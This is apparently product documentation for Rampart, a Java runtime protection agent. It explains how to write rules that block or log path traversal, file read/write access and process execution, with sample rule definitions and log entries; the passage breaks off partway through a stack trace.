
ℹ️ Path Traversal vulnerabilities are covered by CWE-22. Specifically, Relative Path Traversal is covered by CWE-23 and Absolute Path Traversal is covered by CWE-36.

The Path Traversal rule can be used to protect against both relative and absolute path traversal attacks. That is:

- Protect against file operations where a user-constructed path allows the user to traverse back to the parent path.
- Protect against file operations where a user-constructed path allows the user to specify an absolute path to a file or a directory.

### Given (Condition)

The Path Traversal security feature is enabled using the Rampart 'filesytem' rule. With this rule the user can specify a single condition - `input`.

| input | This allows the user to specify the source of the untrusted data. The following three sources are supported:
• ‘http’ data introduced via HTTP/HTTPS requests
• ‘database’ data introduced via JDBC connections
• ‘deserialization’ data introduced via Java or XML deserialization
The rule triggers if the source of the untrusted data matches that specified in the rule. If no value is specified then a default value of ‘http’ is used. An exception is thrown if an unsupported value is provided. |

⚠️ This rule provides protection only when user input is received via an API that is enabled in the 'input' declaration of the rule.

### When (Event)

| traversal | This is a mandatory condition that allows the user to specify the type of path traversal protection to enable. The following protection types are supported:
• ‘relative’
• ‘absolute’
Each rule may contain a single protection type. If no value is specified then, by default, protection is enabled for both ‘relative’ and ‘absolute’ path traversal attacks. |

### Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Path traversal attacks are blocked by the agent. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. Path Traversal attacks are allowed by the agent. If configured, a log message is generated with details of the event. A log message must be specified with this action. |


As part of the action statement, the user may optionally specify the parameter 'stacktrace: “full”'. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

### Example

The following `filesystem` rule is used to protect an application from both relative and absolute path traversal attacks.

The `input` declaration is satisfied when the untrusted data originates from an HTTP/HTTPS request. Since no value is specified inside the `traversal` declaration, the rule triggers when the resulting path either allows the user to traverse back to the parent path or to specify an absolute path to a file or a directory.

An action of `protect` is defined to ensure that the agent blocks such requests. A log message and severity are both specified which are included in any generated log entries if an attack is detected.

```
app("Path Traversal mod"):
    requires(version: Rampart/2.10)
    filesystem("Protect against relative and absolute path traversal attacks"):
        input(http)
        traversal()
        protect(message: "Path Traversal attack blocked", severity: 8)
    endfilesystem
endapp
```

### Logging

When the above filesystem rule is triggered a log entry similar to the following is generated:

• relative

```
<10>1 2021-03-30T17:31:15.236+01:00 userX_system java 32008 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect against relative and absolute path traversal attacks|Execute Rule|High|rt=Mar 30 2021 17:31:15.234 +0100 dvchost=userX_system procid=32008 appVersion=1 ruleType=filesystem securityFeature=filesystem path traversal act=protect msg=Path Traversal attack blocked path=/tmp/tomcat/webapps/spiracle/pathTraversal/testFilesParent/testFilesChild/../TestFile httpSessionId=3153E581A645E2A54D3C12D3928473BC taintSource=HTTP_SERVLET httpRequestUri=/spiracle/FileServlet01 httpRequestMethod=GET internalHttpRequestUri=/spiracle/FileServlet01 httpCookies=JSESSIONID\=3153E581A645E2A54D3C12D3928473BC remoteIpAddress=0:0:0:0:0:0:0:1
```

• absolute

```
<10>1 2021-03-30T17:32:30.903+01:00 userX_system java 32008 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect against relative and absolute path traversal attacks|Execute Rule|High|rt=Mar 30 2021 17:32:30.903 +0100 dvchost=userX_system procid=32008 appVersion=1 ruleType=filesystem securityFeature=filesystem path traversal act=protect msg=Path Traversal attack blocked path=/tmp/somefile.txt httpSessionId=3153E581A645E2A54D3C12D3928473BC taintSource=HTTP_SERVLET httpRequestUri=/spiracle/FileServlet03 httpRequestMethod=GET internalHttpRequestUri=/spiracle/FileServlet03 httpCookies=JSESSIONID\=3153E581A645E2A54D3C12D3928473BC remoteIpAddress=0:0:0:0:0:0:0:1
```

## Further Examples

The following mod is the same as the previous example, with the stacktrace also logged:

```
app("Path Traversal mod - with stacktrace"):
    requires(version: Rampart/2.10)
    filesystem("Protect against relative and absolute path traversal attacks"):
        input(http)
        traversal()
        protect(message: "Path Traversal attack blocked", severity: 8, stacktrace: "full")
    endfilesystem
endapp
```

### Logging

When the above filesystem rule is triggered a log entry similar to the following is generated:

• relative

```
<10>1 2021-04-01T11:37:24.203+01:00 userX_system java 25024 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect against relative and absolute path traversal attacks|Execute Rule|High|rt=Apr 01 2021 11:37:24.201 +0100 dvchost=userX_system procid=25024 appVersion=1 ruleType=filesystem securityFeature=filesystem path traversal act=protect msg=Path Traversal attack blocked stacktrace=com.example.spiracle.path_traversal.FileServlet01.doPost(FileServlet01.java:71)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:650)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:318)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) path=/tmp/tomcat/webapps/spiracle/pathTraversal/testFilesParent/testFilesChild/../TestFile httpSessionId=2912BD6B199C8B891244E63DC7DBCDE3 taintSource=HTTP_SERVLET httpRequestUri=/spiracle/FileServlet01 httpRequestMethod=GET internalHttpRequestUri=/spiracle/FileServlet01 httpCookies=JSESSIONID\=2912BD6B199C8B891244E63DC7DBCDE3 remoteIpAddress=0:0:0:0:0:0:0:1
```

• absolute

```
<10>1 2021-04-01T12:02:26.629+01:00 userX_system java 25024 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect against relative and absolute path traversal attacks|Execute Rule|High|rt=Apr 01 2021 12:02:26.627 +0100 dvchost=userX_system procid=25024 appVersion=1 ruleType=filesystem securityFeature=filesystem path traversal act=protect msg=Path Traversal attack blocked stacktrace=com.example.spiracle.path_traversal.FileServlet03.doPost(FileServlet03.java:68)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:650)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) path=/tmp/somefile.txt httpSessionId=2912BD6B199C8B891244E63DC7DBCDE3 taintSource=HTTP_SERVLET httpRequestUri=/spiracle/FileServlet03 httpRequestMethod=GET internalHttpRequestUri=/spiracle/FileServlet03 httpCookies=JSESSIONID\=2912BD6B199C8B891244E63DC7DBCDE3 remoteIpAddress=0:0:0:0:0:0:0:1
```

The following mod protects against relative path traversal attacks that originate from a JDBC connection:

```
app("Path Traversal mod 2"):
    requires(version: Rampart/2.10)
    filesystem("Protect against relative path traversal attacks"):
        input(database)
        traversal(relative)
        protect(message: "Path Traversal attack blocked", severity: High)
    endfilesystem
endapp
```

The following mod monitors for absolute path traversal attacks that originate from an HTTP/HTTPS request:

```
app("Path Traversal mod 3"):
    requires(version: Rampart/2.10)
    filesystem("Detect and log absolute path traversal attacks"):
        input(http)
        traversal(absolute)
        detect(message: "Path Traversal attack detected", severity: Medium)
    endfilesystem
endapp
```

The following mod protects against relative path traversal attacks that originate from various untrusted sources. Logging is switched off by the omission of the log message parameter:

```
app("Path Traversal mod 4"):
    requires(version: Rampart/2.10)
    filesystem("Protect against relative and absolute path traversal attacks"):
        input(deserialization, http, database)
        traversal()
        protect()
    endfilesystem
endapp
```

# **File I/O Security Feature**

ℹ️ Please see the **API Protect Directives** section of this document for information on how to configure this rule for API endpoint protection.

## Overview

File operations, such as opening for reading or writing, or modifying file attributes (such as last modified dates, etc.) can be controlled using the Rampart `filesystem` rule.

Some high-level examples of rules are:

- Log a warning upon writing to any file
- Allow / deny creation of new files in certain directories
- Disallow writing to, or modification of JAR files
- Protect arbitrary files or directories from modification (for example, based on file extension, such as .rules and .xml files)

## When (Event)

To control read and write access to files using the Rampart ‘filesystem’ rule, the user can specify either the ‘read’ or ‘write’ declaration, respectively.

| read/write | The user must specify either the ‘read’ or the ‘write’ declaration. A parameter must be supplied to the ‘read’ or ‘write’ declaration to determine the files and/or directories to which the Rampart ‘filesystem’ rule should control access. Both Unix and Windows filesystem paths are supported. This parameter takes the form of a list of (one or more) quoted strings indicating specifically targeted files/directories. Each string represented in the parameter can be:
• a single file or directory name - the agent controls access to any file or directory on the filesystem that matches the given name
• an absolute path to a specific file or directory
The wildcard character (*) is supported anywhere in the file name or path:
• only one wildcard character can be used with each path
• if used at the end of a file path, the wildcard represents all files and sub-directories recursively
◦ this is equivalent to the file path simply ending with a file separator
• if used in the middle of a file path, the wildcard represents a single level of directories only
• the wildcard can be used to specify all files with a specific prefix
• the wildcard character specified on its own represents all files and directories on the filesystem |
## Then (Action)

There are three supported actions for the Rampart filesystem rule: protect***,*** detect and allow*.*

| Action | Description |
| ------ | ----------- |
| protect | All attempts to read from or write to a protected file are blocked. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. A log message is generated with details of all attempts to read from or write to a protected file. A log message must be specified with this action. |
| allow | Can be used to allow access to specific files or directories under a parent directory that is covered by a Rampart ‘filesystem’ rule in `protect` mode. |

As part of the action statement, the user may optionally specify the parameter 'stacktrace: “full”'. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

All examples of the Rampart filesystem rule are given for both Unix and Windows-style filesystem paths, where appropriate.

In the following example, we define a Rampart filesystem rule that protects all files in a specific directory from being read.

Unix:

```
app("File read protect mod"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access in specific directory"):
        read("/tmp/*")
        protect(message: "Unauthorized file read blocked", severity: 8)
    endfilesystem
endapp
```

Windows:

```
app("File read protect mod"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access in specific directory"):
        read("C:\\Windows\\*")
        protect(message: "Unauthorized file read blocked", severity: 8)
    endfilesystem
endapp
```

ℹ️ Specifying ‘read("/tmp/")’ and ‘read("C:\\Windows\\")’ would be functionally equivalent ‘read’ declarations in the two mods above, respectively.

### Logging

```
<10>1 2021-03-29T11:59:25.147+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect read access in specific directory|Execute Rule|High|rt=Mar 29 2021 11:59:25.146 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=filesystem securityFeature=filesystem read act=protect msg=Unauthorized file read blocked path=/tmp/somefile.txt
```

```
<10>1 2021-03-29T11:57:23.337+01:00 userX_system java 14223 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect read access in specific directory|Execute Rule|High|rt=Mar 29 2021 11:57:23.337 +0100 dvchost=userX_system procid=14223 appVersion=1 ruleType=filesystem securityFeature=filesystem read act=protect msg=Unauthorized file read blocked path=C:\\Windows\\somefile.txt
```

## Further Examples

**As above, with the stacktrace also logged**

Unix:

```
app("File read protect mod - with stacktrace"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access in specific directory"):
        read("/tmp/*")
        protect(message: "Unauthorized file read blocked", severity: 8, stacktrace: "full")
    endfilesystem
endapp
```

Windows:

```
app("File read protect mod - with stacktrace"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access in specific directory"):
        read("C:\\Windows\\*")
        protect(message: "Unauthorized file read blocked", severity: 8, stacktrace: "full")
    endfilesystem
endapp
```

### Logging

```
<10>1 2021-03-29T12:05:25.019+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect read access in specific directory|Execute Rule|High|rt=Mar 29 2021 12:05:25.019 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=filesystem securityFeature=filesystem read act=protect msg=Unauthorized file read blocked stacktrace=java.util.Scanner.<init>(Scanner.java:611)\ncom.example.spiracle.file.FileServlet.readFile(FileServlet.java:109)\ncom.example.spiracle.file.FileServlet.read(FileServlet.java:90)\ncom.example.spiracle.file.FileServlet.executeRequest(FileServlet.java:71)\ncom.example.spiracle.file.FileServlet.doPost(FileServlet.java:60)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:650)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.GeneratedMethodAccessor32.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.GeneratedMethodAccessor46.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) path=/tmp/somefile.txt
```

```
<10>1 2021-03-29T12:55:25.034+01:00 userX_system java 14222 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect read access in specific directory|Execute Rule|High|rt=Mar 29 2021 12:55:25.034 +0100 dvchost=userX_system procid=14222 appVersion=1 ruleType=filesystem securityFeature=filesystem read act=protect msg=Unauthorized file read blocked stacktrace=java.util.Scanner.<init>(Scanner.java:611)\ncom.example.spiracle.file.FileServlet.readFile(FileServlet.java:109)\ncom.example.spiracle.file.FileServlet.read(FileServlet.java:90)\ncom.example.spiracle.file.FileServlet.executeRequest(FileServlet.java:71)\ncom.example.spiracle.file.FileServlet.doPost(FileServlet.java:60)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:650)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.GeneratedMethodAccessor32.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.GeneratedMethodAccessor46.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) path=C:\\Windows\\somefile.txt
```

**Prevent reading any file**

```
app("File read protect mod - wildcard all"):
    requires(version: Rampart/2.10)
    filesystem("Protect all read access"):
        read("*")
        protect(message: "Unauthorized file read blocked", severity: 8)
    endfilesystem
endapp
```

**Prevent writing to any file**

```
app("File write protect mod - wildcard all"):
    requires(version: Rampart/2.10)
    filesystem("Protect all write access"):
        write("*")
        protect(message: "Unauthorized file write blocked", severity: 8)
    endfilesystem
endapp
```

**Prevent reading specific files**

Unix:

```
app("File read protect mod - specific files"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access to specific files"):
        read("/tmp/somefile.txt", "/tmp/somefile2.txt")
        protect(message: "Unauthorized file read blocked", severity: 8)
    endfilesystem
endapp
```

Windows:

```
app("File read protect mod - specific files"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access to specific files"):
        read("C:\\Windows\\somefile.txt", "C:\\Windows\\somefile2.txt")
        protect(message: "Unauthorized file read blocked", severity: 8)
        endfilesystem
endapp
```

**Detect attempts to write to a particular directory**

Unix:

```
app("File write detect mod - particular directory"):
    requires(version: Rampart/2.10)
    filesystem("Detect write operations"):
        write("/tmp/")
        detect(message: "Unauthorized file write detected", severity: 5)
    endfilesystem
endapp
```

Windows:

```
app("File write detect mod - particular directory"):
    requires(version: Rampart/2.10)
    filesystem("Detect write operations"):
        write("C:\\Windows\\")
        detect(message: "Unauthorized file write detected", severity: 5)
    endfilesystem
endapp
```

**Detect reading of any file with a specific name**

```
app("File read detect mod - specific filename"):
    requires(version: Rampart/2.10)
    filesystem("Detect read of a file with a specific name"):
        read("somefile.txt")
        detect(message: "Unauthorized file read detected", severity: 5)
    endfilesystem
endapp
```

**Prevent writing to any file where the filename ends with a specific string**

```
app("File write protect mod - file extension"):
    requires(version: Rampart/2.10)
    filesystem("Protect write access to .txt files"):
        write("*.txt")
        protect(message: "Unauthorized file write blocked", severity: 8)
    endfilesystem
endapp
```

**Prevent reading any file of a given name in any immediate sub-directories of a particular directory**

Unix:

```
app("File read protect mod"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access"):
        read("/tmp/*/somefile.txt")
        protect(message: "Unauthorized file read blocked", severity: Medium)
    endfilesystem
endapp
```

Windows:

```
app("File read protect mod"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access"):
        read("C:\\Windows\\*\\somefile.txt")
        protect(message: "Unauthorized file read blocked", severity: Medium)
    endfilesystem
endapp
```

**Prevent reading of all files in a directory, but allow reading of a specific file in this directory**

Unix:

```
app("File read controls"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access to files in /tmp"):
        read("/tmp/")
        protect(message: "Unauthorized file read blocked", severity: High)
    endfilesystem
    filesystem("Allow read access to /tmp/somefile.txt")
        read("/tmp/somefile.txt")
        allow(message: "Read access to /tmp/somefile.txt allowed", severity: Medium)
    endfilesystem
endapp
```

Windows:

```
app("File read controls"):
    requires(version: Rampart/2.10)
    filesystem("Protect read access to files in C:\\Windows"):
        read("C:\\Windows\\")
        protect(message: "Unauthorized file read blocked", severity: High)
    endfilesystem
    filesystem("Allow read access to C:\\Windows\somefile.txt"):
        read("C:\\Windows\\somefile.txt")
        allow(message: "Read access to C:\\Windows\somefile.txt allowed", severity: Medium)
    endfilesystem
endapp
```

# **Rampart Process Rule**

ℹ️ Please see the **API Protect Directives** section of this document for information on how to configure this rule for API endpoint protection.

## Overview

The Rampart `process` rule can be used to control the access that an application has when executing external processes on the server. This is useful for preventing unauthorized attempts at process forking.

## When (Event)

To control access to executables using the Rampart `process` rule, the user must specify the `execute` declaration.

| execute | A parameter must be supplied to the ‘execute’ declaration to determine the executable(s) to which the Rampart ‘process’ rule should control access. Both Unix and Windows filesystem paths are supported. This parameter takes the form of a list of one or more quoted strings indicating specifically targeted executables. Each string represented in the parameter can be:
• a single executable or directory name - the agent controls access to any executable or directory on the filesystem that matches the given name
• an absolute path to a specific executable or directory
The wildcard character (*) is supported anywhere in the executable name or path:
• only one wildcard character can be used with each path
• the wildcard can only target a single directory
• the wildcard can be used to specify all executables with a specific prefix
• the wildcard character specified on its own represents all executables and directories on the filesystem |
## Then (Action)

There are three supported actions for the Rampart `process` rule: `protect`, `detect` and `allow`.

| Action | Description |
| ------ | ----------- |
| protect | All attempts to fork a process are blocked. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. A log message is generated with details of all attempts to fork a process. A log message must be specified with this action. |
| allow | Can be used to allow access to execute specific processes which are a subset of protected executables covered by a Rampart ‘process’ rule in `protect` mode. |

As part of the action statement, the user may optionally specify the parameter `stacktrace: “full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

All examples of the Rampart `process` rule are given for both Unix and Windows-style filesystem paths, where appropriate.

In the following example, we define a Rampart `process` rule that prevents forking of all processes inside a specific directory.

Unix:

```
app("Process forking mod"):
  requires(version: Rampart/2.10)
  process("Protect executable in a specific directory"):
    execute("/tmp/*")
    protect(message: "denying attempt to execute processes inside specific directory", severity: 10)
  endprocess
endapp
```

Windows:

```
app("Process forking mod"):
  requires(version: Rampart/2.10)
  process("Protect executable in a specific directory"):
    execute("C:\\Windows\\*")
    protect(message: "denying attempt to execute processes inside specific directory", severity: 10)
  endprocess
endapp
```

### Logging

Unix:

```
<9>1 2021-03-29T11:44:30.233+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect executable in a specific directory|Execute Rule|Very-High|rt=Mar 29 2021 11:44:30.232 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=process securityFeature=process act=protect msg=denying attempt to execute processes inside specific directory path=/tmp/myscript.sh commandLine=myscript.sh scriptArg
```

Windows:

```
<9>1 2021-03-29T11:47:50.278+01:00 userX_system java 13286 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect executable in a specific directory|Execute Rule|Very-High|rt=Mar 29 2021 11:47:50.278 +0100 dvchost=userX_system procid=13286 appVersion=1 ruleType=process securityFeature=process act=protect msg=denying attempt to execute processes inside specific directory path=C:\\Windows\\myscript.bat commandLine=myscript.bat scriptArg
```

## Further Examples

**As above, with the stacktrace also logged**

Unix:

```
app("Process forking mod - with stacktrace"):
  requires(version: Rampart/2.10)
  process("Protect executable in a specific directory"):
    execute("/tmp/*")
    protect(message: "denying attempt to execute processes inside specific directory", severity: 10, stacktrace: "full")
  endprocess
endapp
```

Windows:

```
app("Process forking mod - with stacktrace"):
  requires(version: Rampart/2.10)
  process("Protect executable in a specific directory"):
    execute("C:\\Windows\\*")
    protect(message: "denying attempt to execute processes inside specific directory", severity: 10, stacktrace: "full")
  endprocess
endapp
```

### Logging

Unix:

```
<9>1 2021-03-29T11:48:42.1089+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect executable in a specific directory|Execute Rule|Very-High|rt=Mar 29 2021 11:48:42.1087 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=process securityFeature=process act=protect msg=denying attempt to execute processes inside specific directory stacktrace=com.example.spiracle.file.FileExecServlet.executeRequest(FileExecServlet.java:78)\ncom.example.spiracle.file.FileExecServlet.doPost(FileExecServlet.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:650)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native 